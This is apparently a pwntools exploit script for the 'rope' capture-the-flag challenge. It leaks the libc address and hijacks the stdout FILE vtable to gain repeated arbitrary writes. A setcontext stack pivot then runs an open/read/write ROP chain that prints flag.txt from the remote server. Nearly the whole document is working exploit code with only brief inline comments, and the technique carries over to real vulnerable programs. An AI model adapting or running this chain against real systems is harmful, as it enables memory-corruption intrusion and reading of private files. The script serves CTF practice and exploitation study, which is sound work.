from pwn import *

context.binary = elf = ELF("./vuln")
libc = ELF("./libc-2.23.so")

#conn = elf.process()
#conn = process(["./ld-2.23.so", "./vuln"], env={"LD_PRELOAD": "./libc-2.23.so"})
conn = remote("rope.chal.imaginaryctf.org", 1337);conn.recvline()

libc.address = int(conn.recvline(), 0) - libc.sym.puts
setcontext_gadget = libc.address + 0x47b85

rop = ROP(libc)

fake = b""
fake += cyclic(0x38)
fake += p64(elf.sym.main + 54) # fake the vtable entry to get infinite writes

#gdb.attach(conn)

# get infinite writes
conn.sendline(fake)
conn.sendline(str(libc.sym._IO_2_1_stdout_ + 0xd8)) # overwrite vtable pointer
conn.sendline(str(elf.sym.inp))

# make it so that push rcx puts a ret gadget on the stack
conn.sendline(fake)
conn.sendline(str(libc.sym._IO_2_1_stdout_ + 0xa8))
conn.sendline(str(rop.find_gadget(["ret"])[0]))

# write flag.txt to memory
conn.sendline(fake)
conn.sendline(str(libc.bss(42)))
conn.sendline(str(u64(b"flag.txt")))

# null terminate flag.txt
conn.sendline(fake)
conn.sendline(str(libc.bss(42+8)))
conn.sendline(str(0))

payload = b""
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(libc.bss(42))
payload += p64(rop.find_gadget(["pop rsi", "ret"])[0])
payload += p64(0)
payload += p64(rop.find_gadget(["pop rdx", "ret"])[0])
payload += p64(0)
payload += p64(rop.find_gadget(["pop rax", "ret"])[0])
payload += p64(2)
payload += p64(rop.find_gadget(["syscall", "ret"])[0])

payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(3)
payload += p64(rop.find_gadget(["pop rsi", "ret"])[0])
payload += p64(libc.bss(42))
payload += p64(rop.find_gadget(["pop rdx", "ret"])[0])
payload += p64(64)
payload += p64(libc.sym.read)

payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(1)
payload += p64(rop.find_gadget(["pop rsi", "ret"])[0])
payload += p64(libc.bss(42))
payload += p64(rop.find_gadget(["pop rdx", "ret"])[0])
payload += p64(64)
payload += p64(libc.sym.write)

fake = b""
fake += cyclic(0x38)
fake += p64(setcontext_gadget) # will trigger rop chain
fake = fake.ljust(0x40, b'\0')
fake += payload

# set up stack pivot
conn.sendline(fake)
conn.sendline(str(libc.sym._IO_2_1_stdout_ + 0xa0))
conn.sendline(str(elf.sym.inp + 0x40))

conn.stream()
#conn.interactive()
